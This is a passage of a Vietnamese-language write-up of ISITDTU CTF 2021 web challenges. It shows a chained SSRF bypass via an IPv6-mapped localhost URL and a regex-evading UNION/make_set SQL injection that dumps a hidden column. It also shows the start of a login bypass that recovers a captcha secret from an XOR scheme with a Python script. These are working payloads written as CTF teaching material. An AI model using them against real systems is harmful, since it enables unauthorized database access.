    <span class="nv">$output</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
    <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
<span class="p">}</span> 
<span class="k">else</span> <span class="p">{</span>
    <span class="k">die</span> <span class="p">(</span><span class="s2">"NO NO NO NO"</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><h4 id="b-homephp">b) home.php:<a href="#b-homephp"><i class="fas fa-hashtag"></i></a></h4></h4><p><img data-proofer-ignore data-src="https://i.imgur.com/tVnPZzL.png" alt="" /></p><p>Có lẽ có một tính năng “ẩn” ở <code class="language-plaintext highlighter-rouge">home.php</code> vì một lí do nào đó chúng ta lại không sử dụng được. Từ source ta biết được rằng <code class="language-plaintext highlighter-rouge">home.php</code> luôn luôn in ra “This is not a private ip” nếu như <a href="https://www.geeksforgeeks.org/php-determining-client-ip-address">client ip address</a> trong request gửi đến trang này không phải là <code class="language-plaintext highlighter-rouge">127.0.0.1</code>:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">"127.0.0.1"</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">die</span><span class="p">(</span><span class="s2">"&lt;center&gt;This is not a private ip&lt;/center&gt;"</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Xem kĩ source thì chúng ta biết được tính năng “ẩn” đó cho phép chúng ta truy vấn thông tin của các user trên web app này thông qua url parameter là <code class="language-plaintext highlighter-rouge">id</code>:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
  <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/sys|procedure|xml|concat|group|db|where|like|limit|in|0x|extract|by|load|as|binary|
    join|using|pow|column|table|exp|info|insert|to|del|admin|pass|sec|hex|username|regex|id|if|case|and|or|ascii|[~.^\-\/\\\=&lt;&gt;+\'"$%#]/i'</span><span class="p">,</span><span class="nv">$id</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">90</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT id,username FROM users WHERE id=</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">;"</span><span class="p">;</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
    <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">"&lt;tr&gt;&lt;th&gt;"</span><span class="mf">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="mf">.</span><span class="s2">"&lt;/th&gt;&lt;th&gt;"</span><span class="mf">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'username'</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">free</span><span class="p">();</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Nhưng đoạn code trên lại không dùng <a href="https://www.w3schools.com/php/php_mysql_prepared_statements.asp">prepared statement</a> để truy vấn mà lại dùng hàm <a href="https://www.php.net/manual/en/sqlite3.query.php">query</a>. Do đó chắn chắn sẽ bị SQL Injection, vấn đề chỉ nằm ở việc có bypass được cái regex <code class="language-plaintext highlighter-rouge">/sys|procedure|xml|concat|group|db|where|like|limit|in|0x|extract|by|load|as|binary|join|using|pow|column|table|exp|info|insert|to|del|admin|pass|sec|hex|username|regex|id|if|case|and|or|ascii|[~.^\-\/\\\=&lt;&gt;+\'"$%#]/i</code> hay không. Có lẽ khai thác SQLi xong chúng ta sẽ lấy được flag?</p><h3 id="3-exploit-and-get-flag-1">3. Exploit and get flag:<a href="#3-exploit-and-get-flag-1"><i class="fas fa-hashtag"></i></a></h3></h3><p>Sau khi xem xét 2 tính năng của <code class="language-plaintext highlighter-rouge">index.php</code> và <code class="language-plaintext highlighter-rouge">home.php</code>, chúng ta có thể rút ra hướng để khai thác như sau:</p><ul><li>Bypass SSRF filter ở chức năng submit url tại trang <code class="language-plaintext highlighter-rouge">index.php</code> sao cho có thể gọi đến localhost của chính web app này, dùng nó để request và in ra nội dung của <code class="language-plaintext highlighter-rouge">home.php</code>.<li>In ra được <code class="language-plaintext highlighter-rouge">home.php</code> thì chỉ việc bypass regex nữa là tha hồ lượn trong database của cái app này.</ul><h5 id="a-bypass-ssrf-filter">a) Bypass SSRF filter:<a href="#a-bypass-ssrf-filter"><i class="fas fa-hashtag"></i></a></h5></h5><p>Để bypass được mọi thể loại filter thì cách nhàn hạ và nhanh nhất để là đi mò cheat sheet :D Sau khi thử hàng loạt payload trong cái <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#payloads-with-localhost">SSRF cheat sheet</a> thần thành này thì mình phát hiện ra có cái này dùng được:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://[0:0:0:0:0:ffff:127.0.0.1]
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.imgur.com/VOawqca.png" alt="" /></p><h4 id="b-bypass-sqli-filter">b) Bypass SQLi filter:<a href="#b-bypass-sqli-filter"><i class="fas fa-hashtag"></i></a></h4></h4><p>Trong regex dùng để filter SQLi này:</p><p><code class="language-plaintext highlighter-rouge">/sys|procedure|xml|concat|group|db|where|like|limit|in|0x|extract|by|load|as|binary|join|using|pow|column|table|exp|info|insert|to|del|admin|pass|sec|hex|username|regex|id|if|case|and|or|ascii|[~.^\-\/\\\=&lt;&gt;+\'"$%#]/i</code></p><p>Chúng ta phát hiện ra không có <code class="language-plaintext highlighter-rouge">union</code> trong số đó. Vậy thì còn ngần ngại gì mà không <a href="https://portswigger.net/web-security/sql-injection/union-attacks">UNION attack</a> nữa!</p><p>Mục tiêu của việc exploit SQLi theo kiểu UNION attack là in ra toàn bộ data từ table <code class="language-plaintext highlighter-rouge">user</code>. Nếu như phải test black box thì cần có 1 bước là xác định số cột của <code class="language-plaintext highlighter-rouge">user</code>, nhưng mà trong source có luôn cả script sql (<a href="https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/last%20point/source/mysql/main.sql">main.sql</a>) tạo table này nên không cần phải làm nữa:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="nv">`users`</span> <span class="p">(</span>
  <span class="nv">`id`</span> <span class="nb">int</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
  <span class="nv">`username`</span> <span class="nb">text</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
  <span class="nv">`password`</span> <span class="nb">text</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
  <span class="nv">`[CENSORED]`</span> <span class="nb">text</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">)</span> <span class="n">ENGINE</span><span class="o">=</span><span class="n">InnoDB</span> <span class="k">DEFAULT</span> <span class="n">CHARSET</span><span class="o">=</span><span class="n">utf8mb4</span><span class="p">;</span>
</pre></table></code></div></div><p>Table <code class="language-plaintext highlighter-rouge">user</code> có 4 column, nhưng lại có 1 column “ẩn” được đánh dấu là <code class="language-plaintext highlighter-rouge">[CENSORED]</code>, rất có thể flag sẽ nằm trong column này. Mặc dù không biết tên column này nhưng chúng ta lại biết được column này có index là 4 trong table <code class="language-plaintext highlighter-rouge">user</code>. Liệu có thể dùng <code class="language-plaintext highlighter-rouge">SELECT</code> để query <code class="language-plaintext highlighter-rouge">user</code> nhưng không dùng tên mà chỉ dùng index của column? Nếu kết hợp khéo léo một chút giữa <code class="language-plaintext highlighter-rouge">SELECT</code> và hàm <a href="https://database.guide/how-the-make_set-function-works-in-mysql/">make_set()</a> trong MySQL thì câu trả lời là có. Quá trình build script với ý tưởng này khá là loằng ngoằng, bạn có thể xem tóm tắt trong hình dưới. Ở đây mình tạo một table user tương tự như của web app nhưng chỉ có 2 cột là id và username.</p><p><img data-proofer-ignore data-src="https://i.imgur.com/j9poFif.png" alt="" /></p><p>Oke, vậy payload SQLi cuối cùng sẽ là:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">make_set</span><span class="p">(</span><span class="mi">1</span><span class="o">|</span><span class="mi">4</span><span class="p">,</span><span class="nv">`2`</span><span class="p">,</span><span class="nv">`3`</span><span class="p">,</span><span class="nv">`4`</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">)</span><span class="n">a</span>
</pre></table></code></div></div><p>Ghép với payload SSRF ở trên nữa ta sẽ lấy được flag:</p><p><img data-proofer-ignore data-src="https://i.imgur.com/CGrDwKp.png" alt="" /></p><p>My final payload:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://[0:0:0:0:0:ffff:127.0.0.1]/home.php?id=1%20union%20select%201,make_set(1%7c4,%602%60,%603%60,%604%60)from(select%201,2,3,4%20union%20select%20*%20from%20users)a
</pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">ISITDTU{w0w_SSRF_ch4in_SQLI_3Zzzz_h3he_!!!!}</code></p><h2 id="-ez-get-flag"><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/147461736-3c4051fc-e4e0-44ac-be5b-3bff75f4ed09.png" alt="image" /> ez get flag<a href="#-ez-get-flag"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>Hơi đáng tiếc vì mình không thể clear được challenge này trong thời gian của cuộc thi. Nhưng không sao, năng lực của mình chỉ đến vậy thì phải chấp nhận, quan trọng là mình đã không chán nản mà vẫn tiếp tục cày cho tới khi clear challenge này, kể cả khi ISITDTU CTF đã end.</p></blockquote><p><img data-proofer-ignore data-src="https://i.imgur.com/0SzcBRJ.png" alt="" /></p><p><a href="https://drive.google.com/file/d/1taM2xhzuIEPIbrsaOYpFzspFhx1CrEx-/view?usp=sharing">Source</a></p><h3 id="1-initial-reconnaissance-2">1. Initial reconnaissance:<a href="#1-initial-reconnaissance-2"><i class="fas fa-hashtag"></i></a></h3></h3><p>Thoạt nhìn thì ai cũng tưởng sẽ phải vào <code class="language-plaintext highlighter-rouge">register</code> để tạo một account mới rồi login vào, nhưng đời không đơn giản như vậy. Nó thậm chí còn không cho register!</p><p><img data-proofer-ignore data-src="https://i.imgur.com/WeqF3R8.png" alt="" /></p><p>Khi nhập linh tinh vào các field của trang <code class="language-plaintext highlighter-rouge">login</code> thì nó sẽ ra như này:</p><p><img data-proofer-ignore data-src="https://i.imgur.com/1wvQfnD.png" alt="" /></p><p>Check source của bài này thì chỉ có 2 trang <code class="language-plaintext highlighter-rouge">register</code> và <code class="language-plaintext highlighter-rouge">login</code> này cho phép free-access. Như vậy chúng ta chỉ còn cách bypass login để mà vào bên trong.</p><h3 id="2-bypass-login">2. Bypass login:<a href="#2-bypass-login"><i class="fas fa-hashtag"></i></a></h3></h3><p>Ta có source của chức năng login như sau:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
	<span class="k">if</span> <span class="s">'username'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
		<span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">'home'</span><span class="p">))</span>
    
	<span class="k">else</span><span class="p">:</span>
		<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
			<span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="o">=</span> <span class="s">''</span><span class="p">,</span> <span class="s">''</span>
			<span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span>
			<span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'password'</span><span class="p">]</span>
			
            <span class="k">if</span> <span class="n">sql</span><span class="p">.</span><span class="n">login_check</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">username</span> <span class="o">==</span> <span class="s">'admin'</span><span class="p">:</span>
				<span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'admin'</span>
				<span class="n">session</span><span class="p">[</span><span class="s">'check'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
				<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'home.html'</span><span class="p">)</span>

			<span class="k">else</span><span class="p">:</span>
				<span class="n">cc</span><span class="p">,</span> <span class="n">secret</span> <span class="o">=</span> <span class="s">''</span><span class="p">,</span> <span class="s">''</span>
				<span class="n">cc</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'captcha'</span><span class="p">]</span>
				<span class="n">secret</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'secret'</span><span class="p">]</span>
				
                <span class="k">if</span> <span class="n">captcha</span><span class="p">.</span><span class="n">check_captcha</span><span class="p">(</span><span class="n">cc</span><span class="p">):</span>
					<span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'guest'</span>
					<span class="n">session</span><span class="p">[</span><span class="s">'check'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
					<span class="n">session</span><span class="p">[</span><span class="s">'sr'</span><span class="p">]</span> <span class="o">=</span> <span class="n">secret</span>
					<span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">'home'</span><span class="p">))</span>

			<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'login.html'</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="s">'Ohhhh Noo - Incorrect !'</span><span class="p">)</span>

		<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'login.html'</span><span class="p">)</span>
</pre></table></code></div></div><p>Từ source ta có thể tóm tắt các thức hoạt động của trang <code class="language-plaintext highlighter-rouge">login</code> như sau:</p><ul><li>Web app này có 2 role là <code class="language-plaintext highlighter-rouge">admin</code> và <code class="language-plaintext highlighter-rouge">guest</code>, và kiểm tra user thuộc role nào thông qua object <code class="language-plaintext highlighter-rouge">session</code>.<li>Dù user là <code class="language-plaintext highlighter-rouge">admin</code> hay <code class="language-plaintext highlighter-rouge">guest</code> thì sau khi login xong đều được redirect đến trang <code class="language-plaintext highlighter-rouge">home</code>. Điểm khác biệt ở đây là <code class="language-plaintext highlighter-rouge">admin</code> sẽ có <code class="language-plaintext highlighter-rouge">session['check'] = 1</code> còn <code class="language-plaintext highlighter-rouge">guest</code> thì có <code class="language-plaintext highlighter-rouge">session['check'] = 0</code> kèm theo đó là <code class="language-plaintext highlighter-rouge">session['sr'] = secret</code>, với biến <code class="language-plaintext highlighter-rouge">secret</code> được nhập vào từ field <code class="language-plaintext highlighter-rouge">Secret (option)</code> của login form.</ul><p>Điều kiện để có thể login như một <code class="language-plaintext highlighter-rouge">admin</code> đó là <code class="language-plaintext highlighter-rouge">sql.login_check(username,password) &gt; 0</code> và <code class="language-plaintext highlighter-rouge">username == 'admin'</code>. Check hàm <code class="language-plaintext highlighter-rouge">login_check</code> xem sao:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">login_check</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>

	<span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="s">'database/users.db'</span><span class="p">)</span>

	<span class="n">row</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * from users where username = ? and password = ?"</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha1</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="p">)).</span><span class="n">fetchall</span><span class="p">()</span>

	<span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">row</span><span class="p">)</span>
</pre></table></code></div></div><p>Như vậy chức năng login sẽ connect với <code class="language-plaintext highlighter-rouge">database/users.db</code> và query từ table <code class="language-plaintext highlighter-rouge">users</code> để check. Theo yêu cầu thứ 2 thì <code class="language-plaintext highlighter-rouge">admin</code> cần có <code class="language-plaintext highlighter-rouge">username == 'admin'</code> nhưng khi check <code class="language-plaintext highlighter-rouge">database/users.db</code> thì lại chỉ có 1 row như này:</p><p><img data-proofer-ignore data-src="https://i.imgur.com/vEn8DbC.png" alt="" /></p><p>Cột password trong table <code class="language-plaintext highlighter-rouge">users</code> đã bị hash. Mà kể cả chúng ta có crack được hash này thì <code class="language-plaintext highlighter-rouge">username</code> sẽ là <code class="language-plaintext highlighter-rouge">taidh</code> chứ không phải <code class="language-plaintext highlighter-rouge">admin</code>, bỏ phương án crack hash này đi cho đỡ mất công.</p><p>Quay sang tìm cách để trở thành <code class="language-plaintext highlighter-rouge">guest</code>. Điều kiện để có thể login như một <code class="language-plaintext highlighter-rouge">guest</code> đó là <code class="language-plaintext highlighter-rouge">captcha.check_captcha(cc) == True</code>. Mặc kệ các field còn lại là <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">password</code>, <code class="language-plaintext highlighter-rouge">secret (option)</code> có như thế nào, chỉ cần nhập đúng captcha vào field <code class="language-plaintext highlighter-rouge">Captcha</code> là vào được trang <code class="language-plaintext highlighter-rouge">home</code>. Check hàm <code class="language-plaintext highlighter-rouge">check_captcha</code> xem sao:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="n">SECRET</span> <span class="o">=</span> <span class="s">'[CENSORED]'</span> <span class="c1"># this is captcha
</span><span class="n">CHECK</span> <span class="o">=</span> <span class="s">'203c0617e3bde7ec99b5b657417a75131e3629b8ffdfdbbbbfd02332'</span>

<span class="k">def</span> <span class="nf">check_captcha</span><span class="p">(</span><span class="n">cc</span><span class="p">):</span>
	<span class="n">msg</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'hello '</span>
	<span class="n">msg</span> <span class="o">+=</span> <span class="n">cc</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
	<span class="k">if</span> <span class="n">calculate</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span> <span class="o">==</span> <span class="n">CHECK</span><span class="p">:</span>
		<span class="k">return</span> <span class="bp">True</span>
	<span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">calculate</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
	<span class="n">c</span> <span class="o">=</span> <span class="p">[]</span>
	<span class="n">a</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="sa">b</span><span class="s">'[CENSORED]'</span><span class="p">)</span>
	<span class="n">b</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="sa">b</span><span class="s">'[CENSORED]'</span><span class="p">)</span>
	<span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
		<span class="n">c</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">a</span> <span class="o">^</span> <span class="n">m</span><span class="p">)</span>
		<span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
	<span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">c</span><span class="p">).</span><span class="nb">hex</span><span class="p">()</span>
</pre></table></code></div></div><p>Biến <code class="language-plaintext highlighter-rouge">cc</code> sau khi truyền vào hàm <code class="language-plaintext highlighter-rouge">check_captcha</code> sẽ được concat với giá trị <a href="https://en.wikipedia.org/wiki/Initialization_vector">IV</a> là biến msg (<code class="language-plaintext highlighter-rouge">msg = b'hello '</code>), sau đó cho tất cả vào hàm <code class="language-plaintext highlighter-rouge">calculate</code> để gen ra một đoạn mã <code class="language-plaintext highlighter-rouge">SECRET</code>, và <code class="language-plaintext highlighter-rouge">SECRET</code> phải giống y như biến <code class="language-plaintext highlighter-rouge">CHECK</code>. Bài toán đặt ra cho chúng ta là: “Tìm 2 giá trị a và b, cho biết giá trị IV và CHECK”.</p><p>Phân tích hàm <code class="language-plaintext highlighter-rouge">caculate</code> thì ta biết được <code class="language-plaintext highlighter-rouge">SECRET</code> được tạo ra như sau:</p><ul><li><p>Tạo một list rỗng <code class="language-plaintext highlighter-rouge">c</code>, sau đó qua mỗi vòng lặp <code class="language-plaintext highlighter-rouge">for m in msg</code> sẽ append thêm <code class="language-plaintext highlighter-rouge">a^m</code> (a XOR m), đồng thời giá trị a sẽ liên tục thay đổi sau 1 vòng lặp theo công thức <code class="language-plaintext highlighter-rouge">a = (a + b) % 256</code>.</p><li><p>Sau khi đã append hết thì list <code class="language-plaintext highlighter-rouge">c</code> sẽ được convert sang dạng bytes và cuối cùng là một string chứa các giá trị hex.</p></ul><p><img data-proofer-ignore data-src="https://i.imgur.com/ngly34K.png" alt="" /></p><p>List <code class="language-plaintext highlighter-rouge">c</code> và hex string <code class="language-plaintext highlighter-rouge">'01020304050607'</code> chỉ mang tính chất minh họa, trên thực tế thì phải là <code class="language-plaintext highlighter-rouge">bytes(c).hex() == CHECK</code>. Lật ngược vấn đề, từ biến <code class="language-plaintext highlighter-rouge">CHECK</code> đã cho chúng ta có thể tìm ra list <code class="language-plaintext highlighter-rouge">c</code>? Giải pháp là sử dụng hàm <a href="https://pythontic.com/containers/bytes/fromhex">fromhex</a>:</p><p><img data-proofer-ignore data-src="https://i.imgur.com/T9g68IH.png" alt="" /></p><p>Từ vòng lặp <code class="language-plaintext highlighter-rouge">for m in msg:</code> thứ nhất ta có <code class="language-plaintext highlighter-rouge">c[0] = a₀ ^ m₀ ⟺ c[0] = a ^ msg[0]</code>, tìm ra được <code class="language-plaintext highlighter-rouge">a = 72 = ord('H')</code>. Sang vòng lặp thứ 2, ta lại có <code class="language-plaintext highlighter-rouge">c[1] = a₁ ^ m₁ ⟺ c[1] = a₁ ^ msg[1] ⟺ a₁ = 60 ^ 101 = 89</code>, từ <code class="language-plaintext highlighter-rouge">a₁</code> và <code class="language-plaintext highlighter-rouge">a₀</code> tìm ra được <code class="language-plaintext highlighter-rouge">b = 17 = ord('\x11')</code> theo công thức: <code class="language-plaintext highlighter-rouge">a₁ = (a₀+b) % 256</code>.</p><p>Tìm được a và b thì coi như bài toán đã kết thúc, chúng ta chỉ chạy một vòng lặp tương tự của hàm <code class="language-plaintext highlighter-rouge">calculate</code>, nhưng thay vì cho a đi xor với từng bytes của msg thì ta xor thẳng với <code class="language-plaintext highlighter-rouge">CHECK</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">gen_captcha</span><span class="p">():</span>
	<span class="n">SECRET</span> <span class="o">=</span> <span class="s">'[CENSORED]'</span> <span class="c1"># this is captcha
</span>	<span class="n">CHECK</span> <span class="o">=</span> <span class="s">'203c0617e3bde7ec99b5b657417a75131e3629b8ffdfdbbbbfd02332'</span>
	<span class="n">head</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'hello '</span>
	<span class="n">array_check</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">CHECK</span><span class="p">))</span>
	<span class="n">ord_a</span> <span class="o">=</span> <span class="n">array_check</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">head</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">ord_b</span> <span class="o">=</span> <span class="p">(</span><span class="n">array_check</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="n">head</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">-</span> <span class="n">ord_a</span>
	<span class="n">head_secret</span> <span class="o">=</span> <span class="s">''</span> 

	<span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">array_check</span><span class="p">:</span>
		<span class="n">head_secret</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">ord_a</span> <span class="o">^</span> <span class="n">r</span><span class="p">)</span>
		<span class="n">ord_a</span> <span class="o">=</span> <span class="p">(</span><span class="n">ord_a</span> <span class="o">+</span> <span class="n">ord_b</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
	<span class="k">if</span> <span class="n">head</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="ow">in</span> <span class="n">head_secret</span><span class="p">:</span>
		<span class="n">SECRET</span> <span class="o">=</span> <span class="n">head_secret</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">head</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">),</span> <span class="s">''</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">SECRET</span>	
